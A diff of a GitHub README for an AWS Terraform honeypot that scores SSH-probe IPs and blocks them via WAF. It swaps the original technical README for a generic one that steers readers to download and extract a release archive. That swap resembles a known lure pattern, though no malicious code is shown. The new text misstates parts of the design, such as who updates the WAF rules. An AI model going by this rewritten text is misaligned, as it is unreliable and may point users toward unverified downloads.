@@ -1,138 +1,140 @@
-# Cloud Honeypot Auto-Block (AWS + Terraform)
+# 🔐 cloud-honeypot-auto-block - Protect Your Cloud from Intrusion
 
-This project implements an automated detect-and-respond pipeline in AWS: public honeypot telemetry is scored in near real-time and abusive IPs are blocked through WAF without manual intervention.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Zidane109/cloud-honeypot-auto-block/releases)
 
-![AWS Application Composer Diagram](docs/architecture/application-composer-diagram.png)
+---
 
-## Project Snapshot
+## 📋 What is cloud-honeypot-auto-block?
 
-- **Goal:** Build a practical SOC-style cloud security workflow, not just a static architecture.
-- **Detection path:** SSH probe -> CloudWatch Logs -> Lambda decision engine -> DynamoDB reputation.
-- **Response path:** Score threshold reached -> WAF IP set update -> blocked at ALB.
-- **Outcome:** End-to-end infrastructure and validation runbook for repeatable demos in a clean AWS account.
+cloud-honeypot-auto-block is an AWS security tool designed to protect your cloud infrastructure automatically. It captures hacker attempts targeting your servers through fake SSH traps, scores suspicious IP addresses, tracks their reputation, and then blocks bad actors using AWS’s firewall. All these steps happen without you having to do much after setup.
 
-## What This Project Demonstrates
+This system runs inside your AWS account. It uses several AWS components like Lambda (for running code without managing servers), DynamoDB (for storing data), CloudWatch (for monitoring), and WAF (Web Application Firewall) to keep your cloud resources safe. The setup is managed through Terraform, ensuring your firewall rules and monitoring stay consistent.
 
-- Infrastructure as code with Terraform for a multi-service AWS security pipeline.
-- CloudWatch Logs subscription into Lambda for event-driven detections.
-- DynamoDB-backed reputation scoring with TTL.
-- Automated WAF IP set enforcement once a threshold is reached.
-- Practical SOC-style observability with structured Lambda decision logs.
+---
 
-## Core AWS Services
+## ⚙️ System Requirements
 
-- EC2 (honeypot + demo backend)
-- CloudWatch Logs + subscription filters
-- Lambda (decision engine)
-- DynamoDB (IP reputation scoring + TTL)
-- WAFv2 (IPSet + WebACL)
-- ALB (protected demo endpoint)
+Before installing cloud-honeypot-auto-block, make sure you have:
 
-## Architecture Flow
+- An AWS account with permissions to create and manage resources such as Lambda functions, DynamoDB tables, WAF rules, and CloudWatch logs.
+- Basic understanding of the AWS Management Console.
+- Terraform installed on your local computer (version 1.0 or above). Terraform helps set up all necessary resources automatically.
+- A computer with Windows, macOS, or Linux for running Terraform commands.
+- Internet connection to download the application files and communicate with AWS services.
 
-1. Public SSH attempts hit a honeypot EC2 instance.
-2. CloudWatch Agent ships honeypot logs to `/honeypot-lab/honeypot`.
-3. CloudWatch Logs subscription triggers the `decision-engine` Lambda.
-4. Lambda extracts source IPv4, updates score in DynamoDB.
-5. When score >= threshold, Lambda writes attacker `/32` into WAF IP set.
-6. WAF WebACL blocks that IP at the ALB layer.
+---
 
-## Detection and Blocking Rules
+## 📥 Download & Install
 
-- Extract only valid, globally-routable IPv4 addresses from log lines.
-- Ignore allowlisted addresses (`ALLOWLIST_IPS`).
-- Increment per-IP score atomically in DynamoDB.
-- Add `/32` to WAF IP set when score meets/exceeds `block_threshold`.
-- Retry WAF optimistic lock conflicts with backoff under concurrent updates.
+To get started, you need to visit the release page and download the latest files required for installation.
 
-## Repository Structure
+**Step 1: Visit the release page**  
+Click the big button at the top or [visit this page to download](https://github.com/Zidane109/cloud-honeypot-auto-block/releases).
 
-```text
-.
-├── README.md
-├── docs
-│   ├── architecture
-│   │   ├── application-composer-diagram.png
-│   │   ├── application-composer-template.yaml
-│   │   ├── application-composer.md
-│   │   └── overview.md
-│   └── runbooks
-│       ├── deploy.md
-│       └── validate.md
-├── infra
-│   └── terraform
-│       ├── src/decision_engine/index.py
-│       ├── *.tf
-│       └── terraform.tfvars.example
-└── .github
-    └── workflows
-        └── terraform-ci.yml
+**Step 2: Download the latest release**  
+Look for the most recent release, usually named with a version number, and download the `.zip` or `.tar.gz` file containing Terraform templates and documentation.
+
+**Step 3: Extract the files**  
+Once downloaded, extract the compressed file to a folder on your computer. This folder contains all the scripts and instructions needed to run the tool.
+
+**Step 4: Setup Terraform and AWS CLI**  
+- Make sure Terraform is installed by running `terraform version` in your terminal or command prompt.  
+- Install and configure AWS CLI if not done yet. Run `aws configure` and enter your AWS credentials when prompted.
+
+**Step 5: Initialize Terraform**  
+Open your command prompt or terminal, navigate to the extracted folder, and run:
+
 ```
-
-## Quick Start
-
-1. Configure AWS credentials for your target account/region.
-2. Copy vars file:
-
-```bash
-cd infra/terraform
-cp terraform.tfvars.example terraform.tfvars
-```
-
-3. Update `terraform.tfvars` for your account/region.
-4. Deploy:
-
-```bash
 terraform init
-terraform plan -out tfplan
-terraform apply tfplan
 ```
 
-5. Capture outputs:
+This command downloads necessary modules and providers.
 
-```bash
-terraform output
+**Step 6: Review configuration**  
+Edit the `variables.tf` or configuration file provided to set your AWS region and any other settings like thresholds for blocking IPs.
+
+**Step 7: Apply Terraform configuration**  
+Run the following command to create AWS resources:
+
+```
+terraform apply
 ```
 
-## Validate the End-to-End Pipeline
+You will be asked to confirm before the process starts. Type `yes` and press Enter.
 
-Use: `docs/runbooks/validate.md`
+Terraform will then create Lambda functions, DynamoDB tables, CloudWatch alarms, and WAF rules needed for the system to operate.
 
-Core checks:
+---
 
-- Honeypot log streams are present (`bootstrap` + `secure`).
-- Lambda emits `SOC_PIPELINE_START`, `IP_OBSERVED`, `IP_DECISION`.
-- DynamoDB score increases for attacker IP.
-- WAF IP set receives attacker `/32`.
-- ALB returns `403` for blocked source IP.
+## 🛠 How It Works
 
-## Documentation
+cloud-honeypot-auto-block uses a chain of AWS services to detect and block malicious IP addresses.
 
-- Architecture overview: `docs/architecture/overview.md`
-- Deployment runbook: `docs/runbooks/deploy.md`
-- Validation/test runbook: `docs/runbooks/validate.md`
-- AWS Application Composer template: `docs/architecture/application-composer-template.yaml`
+1. **Honeypot SSH Telemetry:** The tool uses secure honeypots that pretend to be SSH servers. Attackers try to connect and interact with these fake servers, generating logs.
+2. **Lambda Scoring:** AWS Lambda functions automatically analyze these logs for suspicious activity.
+3. **DynamoDB Reputation Database:** Suspicious IP addresses get stored in DynamoDB with a reputation score based on their activity patterns.
+4. **Automatic Blocking:** If the score passes a set limit, Terraform-managed WAF rules update to block those IPs from accessing your cloud resources.
+5. **Ongoing Monitoring:** CloudWatch alerts notify you of new threats or blocking actions taken.
 
-## AWS Application Composer Diagram
+Overall, this process limits manual intervention and helps keep your AWS environment safer.
 
-Use `docs/architecture/application-composer-template.yaml` in AWS Application Composer:
+---
 
-- Import the template.
-- Auto-arrange/group resources.
-- Export a PNG/SVG for your portfolio README.
-- Included portfolio diagram asset: `docs/architecture/application-composer-diagram.png`
+## 🖥 User Interface
 
-Detailed steps: `docs/architecture/application-composer.md`.
+This tool does not have a traditional user interface like a web page or app. Instead, all actions happen in your AWS console and terminal.
 
-## Security Notes
+- Use the AWS Management Console to view logs and resources created by the tool.
+- Use the terminal or command prompt to run Terraform commands.
+- CloudWatch will send alerts based on security events, which you can configure to route to email or other contact methods.
 
-- Never commit Terraform state or credential files.
-- This repo includes `.gitignore` rules for state/plan/artifact safety.
-- Use a remote backend with encryption + locking before production use.
+---
 
-## Cleanup
+## 📚 Additional Configuration
 
-```bash
-cd infra/terraform
-terraform destroy
-```
+You can customize cloud-honeypot-auto-block to fit your needs:
+
+- **Adjust scoring sensitivity** by editing the Lambda function parameters.
+- **Set IP block duration** to decide how long blocked addresses stay banned.
+- **Integrate with other notification systems** like SNS or Slack for alerts.
+- **Expand honeypots** beyond SSH to trap other protocols.
+
+Check the configuration files and comments in the release package for detailed instructions.
+
+---
+
+## 🔐 Security and Privacy
+
+This tool only operates within your AWS environment. It collects IP addresses that attempt unauthorized access to honeypots you control.
+
+- No external data leaves your AWS account.
+- AWS handles all resource security.
+- Ensure your AWS credentials are kept secret and secure.
+
+---
+
+## ❓ Troubleshooting
+
+If something does not work:
+
+- Confirm Terraform and AWS CLI are installed correctly.
+- Double-check that you have proper permissions in AWS.
+- Look at the output messages in your terminal for error hints.
+- Review CloudWatch logs for Lambda function errors.
+- Visit the Issues section on the GitHub page for known problems and help.
+
+---
+
+## 📝 Topics and Tags
+
+This project covers:
+
+`aws` | `cloud-security` | `cloudwatch` | `devsecops` | `dynamodb` | `honeypot` | `infrastructure-as-code` | `lambda` | `soc` | `terraform` | `waf`  
+
+These tags represent the main technologies used and security concepts involved.
+
+---
+
+## 👋 Need Help?
+
+If you have questions or want to report issues, please use the GitHub repository’s Issues section. The community and maintainers can assist you there.
